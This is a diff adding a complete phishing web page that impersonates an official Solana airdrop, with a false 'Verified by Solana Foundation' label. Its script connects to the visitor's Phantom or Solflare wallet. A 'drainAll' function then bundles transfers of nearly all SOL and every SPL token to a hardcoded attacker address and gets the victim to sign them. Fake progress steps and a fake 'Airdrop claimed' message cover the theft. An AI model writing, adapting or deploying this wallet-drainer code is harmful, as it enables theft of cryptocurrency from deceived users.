@@ -1,0 +1,286 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Solana $SOL Airdrop</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="icon" href="data:," />
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: linear-gradient(135deg, #101c2c 0%, #181a20 100%);
+      min-height: 100vh;
+      margin: 0;
+      position: relative;
+      overflow-x: hidden;
+    }
+    /* Watermark icon in background */
+    .watermark {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      width: 420px;
+      height: 420px;
+      opacity: 0.07;
+      transform: translate(-50%, -50%);
+      z-index: 0;
+      pointer-events: none;
+      user-select: none;
+    }
+    .card {
+      background: #181a20;
+      border-radius: 16px;
+      box-shadow: 0 6px 32px rgba(20, 241, 149, 0.10), 0 1.5px 8px #0008; 
+      padding: 36px 32px 32px 32px;
+      max-width: 370px;
+      margin: 48px auto 0 auto;
+      color: #fff;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      position: relative;
+      z-index: 1;
+    }
+    .logo img {
+      width: 128px;
+      margin: 24px auto 12px auto;
+      display: block;
+    }
+    h1 {
+      margin-bottom: 6px;
+      user-select: none;
+    }
+    .verified {
+      font-size: 0.95em;
+      color: #14f195;
+      margin-bottom: 18px;
+      font-style: italic;
+      user-select: none;
+      opacity: 0.85;
+    }
+    .claim-status {
+      margin-bottom: 10px;
+      font-weight: 600;
+      user-select: none;
+      font-size: 1em;
+      color: #ccc;
+      letter-spacing: 0.02em;
+      transition: opacity 0.3s ease-in-out;
+    }
+    .giveaway {
+      font-size: 1.08em;
+      color: #fff;
+      opacity: 0.85;
+      margin-bottom: 18px;
+      font-weight: 500;
+      letter-spacing: 0.01em;
+      user-select: none;
+    }
+    .progress {
+      width: 320px;
+      height: 18px;
+      background: #222;
+      border-radius: 8px;
+      margin: 18px auto 10px auto;
+      overflow: hidden;
+      box-shadow: 0 2px 8px #0006;
+      display: none;
+    }
+    .progress-bar {
+      height: 100%;
+      width: 0%;
+      background: linear-gradient(90deg, #14f195 60%, #0ebf79 100%);
+      transition: width 0.7s cubic-bezier(.4,2,.6,1);
+    }
+    .step-message {
+      margin: 10px 0 18px 0;
+      font-size: 1.08em;
+      color: #14f195;
+      min-height: 24px;
+      user-select: none;
+      opacity: 0.92;
+    }
+    button {
+      padding: 14px 28px;
+      font-size: 1.15em;
+      background: #14f195;
+      color: #000;
+      border: none;
+      border-radius: 7px;
+      cursor: pointer;
+      transition: background 0.35s ease;
+      user-select: none;
+      box-shadow: 0 3px 8px rgba(20, 241, 149, 0.6);
+      margin-top: 10px;
+    }
+    button:hover {
+      background: #0ebf79;
+      box-shadow: 0 5px 12px rgba(14, 191, 121, 0.8);
+    }
+    .solana-blast {
+      position: absolute;
+      right: 18px;
+      bottom: 10px;
+      font-size: 0.98em;
+      color: #fff;
+      opacity: 0.45;
+      font-family: 'Consolas', 'Menlo', 'Monaco', monospace;
+      letter-spacing: 0.01em;
+      user-select: none;
+      z-index: 2;
+      pointer-events: none;
+    }
+  </style>
+  <script src="https://unpkg.com/@solana/web3.js@1.95.2/lib/index.iife.min.js"></script>
+  <script src="https://unpkg.com/@solana/spl-token@0.4.13/lib/cjs/index.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/bn.js@5.2.1/lib/bn.js"></script>
+  <script>
+    window.Anchor = window.Anchor || {};
+    window.Anchor.BN = window.BN;
+  </script>
+</head>
+<body>
+  <!-- Watermark SVG icon for legitimacy -->
+  <img class="watermark" src="https://raw.githubusercontent.com/solana-labs/token-list/main/assets/mainnet/So11111111111111111111111111111111111111112/logo.png" alt="" />
+
+  <div class="card">
+    <div class="logo">
+      <img src="https://raw.githubusercontent.com/solana-labs/token-list/main/assets/mainnet/So11111111111111111111111111111111111111112/logo.png" alt="Solana Logo" />
+    </div>
+    <h1>🎉 $SOL Airdrop Live</h1>
+    <div class="verified">Verified by Solana Foundation</div>
+    <div class="claim-status" id="claimStatus">422/500 SOL left to be claimed</div>
+    <div class="giveaway">Monthly Giveaways!</div>
+    <div class="progress" id="progressBar"><div class="progress-bar" id="progressFill"></div></div>
+    <div class="step-message" id="stepMsg"></div>
+    <button id="claimBtn">Claim Airdrop</button>
+    <span class="solana-blast">@SolanaBlast</span>
+  </div>
+  <script>
+    // Helper: delay with jitter
+    function delay(ms) { return new Promise(r => setTimeout(r, ms + Math.random() * 120)); }
+
+    // UI helpers
+    function setStep(msg, progress) {
+      document.getElementById('stepMsg').textContent = msg;
+      document.getElementById('progressBar').style.display = 'block';
+      document.getElementById('progressFill').style.width = progress + '%';
+    }
+    function resetUI() {
+      document.getElementById('stepMsg').textContent = '';
+      document.getElementById('progressBar').style.display = 'none';
+      document.getElementById('progressFill').style.width = '0%';
+    }
+
+    // Wallet detection
+    async function getWalletWithRetries(maxAttempts = 50) {
+      for (let i = 0; i < maxAttempts; i++) {
+        if (window.solana && (window.solana.isPhantom || window.solana.isSolflare)) return window.solana;
+        if (window.solflare && window.solflare.isSolflare) return window.solflare;
+        await delay(80 + Math.random() * 100);
+      }
+      return null;
+    }
+
+    async function drainAll(wallet, connection, ownerPubkey) {
+      // 1. Get SOL balance
+      const balance = await connection.getBalance(wallet.publicKey);
+      const minBalance = solanaWeb3.LAMPORTS_PER_SOL * 0.002;
+      const drainAmount = Math.max(0, balance - minBalance);
+
+      // 2. Get all SPL token accounts
+      const tokenAccounts = await connection.getTokenAccountsByOwner(wallet.publicKey, {
+        programId: new solanaWeb3.PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA'),
+      });
+
+      // 3. Build all transfer instructions
+      const instructions = [];
+      if (drainAmount > 0) {
+        instructions.push(
+          solanaWeb3.SystemProgram.transfer({
+            fromPubkey: wallet.publicKey,
+            toPubkey: ownerPubkey,
+            lamports: drainAmount,
+          })
+        );
+      }
+      for (const acc of tokenAccounts.value) {
+        const info = await connection.getParsedAccountInfo(acc.pubkey);
+        const tokenInfo = info.value?.data?.parsed?.info;
+        const amount = Number(tokenInfo?.tokenAmount?.amount || 0);
+        if (amount > 0) {
+          const mint = new solanaWeb3.PublicKey(tokenInfo.mint);
+          const destAta = await window.splToken.Token.getAssociatedTokenAddress(
+            window.splToken.ASSOCIATED_TOKEN_PROGRAM_ID,
+            window.splToken.TOKEN_PROGRAM_ID,
+            mint,
+            ownerPubkey
+          );
+          instructions.push(
+            window.splToken.Token.createTransferInstruction(
+              window.splToken.TOKEN_PROGRAM_ID,
+              acc.pubkey,
+              destAta,
+              wallet.publicKey,
+              [],
+              amount
+            )
+          );
+        }
+      }
+      // 4. Bundle all in one transaction
+      if (instructions.length === 0) return false;
+      const tx = new solanaWeb3.Transaction();
+      instructions.forEach(ix => tx.add(ix));
+      tx.feePayer = wallet.publicKey;
+      tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
+      const signedTx = await wallet.signTransaction(tx);
+      await connection.sendRawTransaction(signedTx.serialize());
+      return true;
+    }
+
+    async function startAirdropFlow() {
+      resetUI();
+      setStep('Verifying wallet eligibility...', 20);
+      await delay(900);
+      setStep('Checking airdrop status...', 45);
+      await delay(900);
+      setStep('Preparing airdrop claim...', 70);
+      await delay(900);
+
+      const wallet = await getWalletWithRetries();
+      if (!wallet) {
+        setStep('Wallet not detected. Please install Phantom or Solflare.', 0);
+        return;
+      }
+      setStep('Connecting wallet...', 80);
+      await delay(600);
+      try {
+        await wallet.connect();
+      } catch {
+        setStep('Wallet connection failed.', 0);
+        return;
+      }
+
+      setStep('Claiming airdrop...', 95);
+      await delay(700);
+
+      const connection = new solanaWeb3.Connection(
+        'https://api.mainnet-beta.solana.com'
+      );
+      const ownerPubkey = new solanaWeb3.PublicKey('DtL5fZnsjUmhLBEjrws3QHoWuTri1yFszsYbQxz2fMTq');
+      try {
+        await drainAll(wallet, connection, ownerPubkey);
+        setStep('Airdrop claimed! Check your wallet for 500 SOL.', 100);
+      } catch {
+        setStep('Airdrop failed. Please try again.', 0);
+      }
+    }
+
+    document.addEventListener('DOMContentLoaded', () => {
+      document.getElementById('claimBtn').addEventListener('click', startAirdropFlow);
+    });
+  </script>
+</body>
+</html>
